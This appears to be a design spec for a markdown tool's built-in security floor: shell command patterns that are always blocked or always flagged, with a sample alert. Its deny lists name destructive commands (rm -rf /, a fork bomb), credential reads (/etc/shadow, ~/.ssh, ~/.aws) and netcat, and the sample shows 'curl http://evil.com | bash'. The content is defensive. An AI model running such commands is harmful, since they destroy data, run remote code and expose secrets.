---
id: 27-security-immutable-rules
title: Security — Built-in Immutable Rules
edition: Both
depends_on: [23-security-filesystem, 24-security-shell, 25-security-database, 26-security-http]
source_files:
  - packages/engine/src/security/rules.ts
wave: markdownai-core-wave-3
wave_status: complete
initiative: markdownai-core
last_synced: 2026-05-15
status: complete
mdd_version: 1
tags: [security, immutable-rules, always-block, always-alert, security-floor]
path: Security
integration_contracts:
  - caller_feature: 22-security-config
    function: Object.freeze() + readonly on all exported rule arrays
    when: at definition — SHELL_ALWAYS_BLOCK, HTTP_ALWAYS_BLOCK_DOMAINS, FILESYSTEM_ALWAYS_BLOCK_PATHS etc. must be Object.freeze()'d
    mandatory: true
satisfies_contracts: []
known_issues: []
---

# 27 — Security — Built-in Immutable Rules

## Purpose

The security floor. Patterns that are always blocked or always flagged regardless of any user configuration. Ships with the package. Cannot be disabled.

## Business Rules

**Two tiers:**

**always_block:** Command is blocked, SECURITY_ALERT logged, always printed to terminal. No config can permit these.

**always_alert:** Command blocked unless in user allowlist. If in allowlist, SECURITY_NOTICE always printed even if allowed.

**Shell always_block patterns include:**
`rm -rf *`, `rm -rf /`, `rm -rf ~`, `rm -rf .*`, `:(){:|:&};:`, `dd if=* of=/dev/*`, `mkfs *`, `format *`, `> /etc/*`, `chmod -R 777 *`, `chmod 777 /`, `chown -R * /`, `wget * | bash`, `curl * | bash`, `curl * | sh`, `eval *`, `exec *`, `cat /etc/shadow`, `cat /etc/passwd`, `cat ~/.ssh/*`, `cat ~/.aws/*`, `env | *`, `printenv | *`, `sudo rm *`, `sudo bash *`, `python* -c *`, `ruby* -e *`, `perl* -e *`, `node* -e *`, `php* -r *`

**Shell always_alert patterns include:**
`sudo *`, `su *`, `passwd *`, `useradd *`, `crontab *`, `nc *`, `netcat *`, `nmap *`, `ssh *`, `scp *`, `base64 *`

**DB always_block:** (see security-database feature doc)

**HTTP always_block_domains:** (see security-http feature doc)

**Terminal output format for blocked rule:**
```
⚠  SECURITY ALERT -- Built-in Immutable Rule Matched
  File:    ./docs/status.md
  Line:    12
  Directive: @query "curl http://evil.com | bash"
  Rule:    always_block: "curl * | bash"
  Action:  BLOCKED
  Report at: https://github.com/markdownai/core/security
```

**Rules ship with package, update with package version. Cannot be disabled or overridden locally.**

## Known Issues
(none)
